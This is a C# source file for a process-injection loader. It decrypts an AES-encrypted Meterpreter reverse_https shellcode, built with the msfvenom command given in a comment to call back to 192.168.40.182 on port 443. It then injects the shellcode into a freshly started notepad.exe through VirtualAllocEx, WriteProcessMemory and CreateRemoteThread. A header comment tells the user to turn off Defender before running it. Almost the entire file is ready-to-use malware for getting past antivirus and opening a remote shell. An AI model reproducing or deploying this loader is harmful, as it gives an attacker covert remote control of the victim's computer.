using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

// 1. Turn off defender 
// 2. Use cmd/powershell/terminal to execute this. Don't execute inside visual studio!

namespace EncryptCreateRemoteThread
{
    class Program
    {
        public static byte[] Aes256Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        public static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https --encrypt aes256 --encrypt-key 9db7ad8ace353ab54a812373d7c0a01f --encrypt-iv 3a9d7c0cf4ac0431 lhost=192.168.40.182 lport=443 exitfunc=thread -f csharp -v bufEncrypted
            byte[] bufEncrypted = new byte[624] {
0x40,0x0a,0xfa,0x66,0xd3,0xdb,0xa1,0x4d,0xa7,0x7a,0x66,0xde,0xef,0x96,0x8d,
0xed,0x01,0x7b,0x09,0xc8,0x17,0x0b,0xd5,0x56,0x32,0x4b,0x75,0x4f,0x8b,0x32,
0x50,0x07,0x30,0xf0,0xc2,0x52,0xe8,0xd5,0x00,0x46,0x36,0x0a,0xb7,0x2b,0x12,
0xbd,0x02,0x81,0xe7,0xf0,0xef,0x13,0x1f,0x6d,0x8a,0xb9,0x1d,0x74,0x00,0xc4,
0xb1,0x51,0x72,0xa0,0xb7,0x95,0x9e,0x9f,0xc3,0x7f,0x26,0xf1,0xf3,0x2b,0x1a,
0xd7,0x94,0x49,0xff,0xd5,0x98,0x26,0x26,0x5a,0x39,0x89,0xd8,0xa0,0xbe,0x69,
0x78,0x52,0xcc,0x60,0x9f,0xb8,0x8c,0xa1,0x62,0x3d,0x80,0xbc,0xde,0x10,0x2e,
0x8f,0xa0,0x8d,0xb4,0xdc,0xe5,0x23,0xc2,0x85,0xe8,0x86,0xfc,0x0a,0x3a,0x88,
0xab,0x08,0x51,0xa3,0x6b,0xeb,0x95,0x97,0x76,0x42,0x71,0x66,0x3d,0x90,0x12,
0xd8,0x27,0xe0,0x1d,0x45,0xff,0x49,0x0d,0x92,0xca,0x45,0xc2,0xe7,0x41,0x6f,
0x74,0x4e,0xc0,0x9d,0x2c,0x2a,0x4b,0xe5,0xaf,0x52,0xd4,0x75,0xc4,0x7f,0x88,
0xa1,0x6d,0x74,0x9e,0x64,0xac,0x84,0x8b,0x36,0xfb,0x79,0x99,0x65,0x7b,0xc7,
0xdc,0x3e,0x34,0x21,0xd2,0xdd,0x1f,0x63,0x96,0xf5,0xbb,0xb2,0xd6,0x5b,0xa7,
0xfb,0xe2,0x6a,0x7a,0x41,0x48,0x3c,0x3b,0x84,0x51,0xb2,0x6e,0x45,0x72,0xf1,
0xaa,0x29,0x21,0xb9,0x6f,0xe4,0xe3,0xce,0x50,0x41,0x48,0x1d,0x56,0x05,0x10,
0x43,0x97,0xcd,0xf3,0x33,0x19,0x38,0x0e,0xd8,0xbf,0x39,0x09,0x79,0x57,0x99,
0xb1,0x30,0x61,0x6c,0x5c,0x62,0xcf,0x25,0xc6,0x4d,0x76,0xbf,0x81,0xd9,0xf0,
0x1c,0x82,0x57,0x9c,0x50,0xec,0x65,0x42,0xdf,0xb1,0xc1,0x4d,0x6a,0x1b,0x51,
0x71,0xd5,0x81,0xb8,0xbf,0x67,0x50,0x74,0x06,0x88,0xb0,0x88,0x73,0x44,0x24,
0xb2,0xdf,0x40,0x6e,0x4c,0x57,0xe5,0xb0,0xe5,0xb3,0x89,0x08,0x78,0xde,0xcc,
0x53,0x5a,0x0c,0xa6,0x61,0xa3,0x06,0x69,0x9e,0x7e,0x74,0xa2,0x53,0xaa,0x4c,
0x18,0xaa,0xb5,0xf6,0xb2,0x79,0x13,0xbf,0x7e,0xa6,0x43,0x8c,0x96,0x14,0x86,
0x3f,0x25,0xcf,0x16,0x45,0x08,0x47,0xf5,0xac,0x81,0xcb,0x15,0x88,0x41,0xf2,
0x79,0xcc,0x6d,0xe0,0xb4,0x86,0x53,0x30,0x8f,0x06,0x74,0xf5,0x3f,0x41,0xab,
0x29,0x73,0x41,0xad,0x81,0xd0,0x58,0xc1,0x73,0x2a,0xce,0x20,0x16,0x39,0xc7,
0xbb,0x8e,0xfa,0x5c,0xea,0x7e,0xcf,0x06,0x69,0xe4,0x9d,0x40,0x5c,0xf0,0x67,
0xba,0xf8,0x2b,0x28,0x49,0x14,0x03,0xea,0x5f,0x5b,0xd1,0x77,0x0f,0x62,0x72,
0x8e,0x31,0xe1,0x2d,0xfc,0xc6,0x74,0xed,0xc0,0xe9,0x6a,0xc4,0xb9,0x33,0x2e,
0x12,0x53,0x24,0x54,0x6c,0xc2,0xc4,0xec,0x13,0xf3,0xd0,0x8c,0xd9,0x1c,0x02,
0xbb,0x98,0x78,0x08,0xb7,0x27,0x14,0x35,0x33,0x3c,0x0a,0xfd,0x47,0x33,0x38,
0x11,0xc8,0xc3,0x48,0x38,0x8b,0x00,0xcb,0xf0,0x6c,0x26,0xd9,0x03,0x34,0x3f,
0xd7,0x26,0x6c,0x57,0x04,0x0f,0x1f,0x73,0xee,0x27,0xcc,0x51,0xb1,0x9d,0x82,
0xc0,0x9c,0xc0,0x18,0xa4,0xcc,0xb4,0x28,0x97,0x6a,0x9f,0x78,0xf6,0xcf,0x1c,
0xee,0x8b,0xa8,0xe7,0xdc,0xa3,0x30,0x14,0xb3,0x19,0x32,0xbd,0x96,0x43,0x86,
0xc8,0xe0,0x38,0xdb,0x7f,0x24,0x56,0x4c,0xa3,0x45,0x77,0xcb,0x0b,0xf6,0x9e,
0x62,0xb2,0x83,0x3c,0x14,0x1c,0x05,0x52,0x5b,0x03,0x78,0x87,0x90,0x57,0x6b,
0xe6,0x41,0x17,0x6f,0xeb,0x75,0x71,0x6a,0x39,0x5f,0xe3,0xaa,0x37,0xd6,0xeb,
0xe0,0xf2,0x6a,0xa7,0x96,0x71,0xa2,0x12,0x2f,0x9f,0xb9,0xe2,0x88,0xa9,0x79,
0x16,0xe5,0x96,0xcd,0x20,0xf9,0x47,0xd8,0x06,0x2d,0xc9,0x87,0x0b,0x21,0xe7,
0x9f,0xc9,0xd7,0xeb,0xa8,0x41,0xde,0x94,0x41,0x3a,0xfd,0x6e,0x8b,0x28,0x99,
0xf3,0xa3,0x5a,0xe3,0x59,0x21,0x0d,0x81,0x9f,0x2d,0x2a,0x78,0x09,0x0f,0xca,
0x94,0x8e,0xf4,0xec,0x0a,0xc9,0x2a,0x62,0xce };

            string key = "9db7ad8ace353ab54a812373d7c0a01f";
            string iv = "3a9d7c0cf4ac0431";
            byte[] buf = Aes256Decrypt(bufEncrypted, Encoding.ASCII.GetBytes(key), Encoding.ASCII.GetBytes(iv));

            var process = Process.Start(@"C:\windows\system32\notepad.exe");
            var pid = process.Id;

            IntPtr hProc = OpenProcess(ProcessAccessFlags.All, false, pid);
            IntPtr pAlloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
            bool rWPM = WriteProcessMemory(hProc, pAlloc, buf, (uint)buf.Length, out IntPtr byteWritten);
            bool rVPE = VirtualProtectEx(hProc, pAlloc, (uint)buf.Length, (uint)MemoryProtection.ExecuteRead, out uint lpflOldProtect);
            IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, (uint)0, pAlloc, IntPtr.Zero, (uint)0, out IntPtr lpThreadId);


            /*Console.WriteLine("[+] Process handle = {0}", hProc.ToInt64().ToString("x2"));
            Console.WriteLine("[+] Allocated memory address = 0x{0}", pAlloc.ToInt64().ToString("x2"));
            Console.WriteLine("[+] WriteProcessMemory result = {0}", rWPM.ToString());
            Console.WriteLine("[+] VirtualProtectExe result = {0}", rVPE.ToString());
            Console.WriteLine("[+] Thread handle = {0}", hThread.ToInt64().ToString("x2"));*/
        }

        //  ============================ PInvoke - Ignore me ============================

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }


    }
}
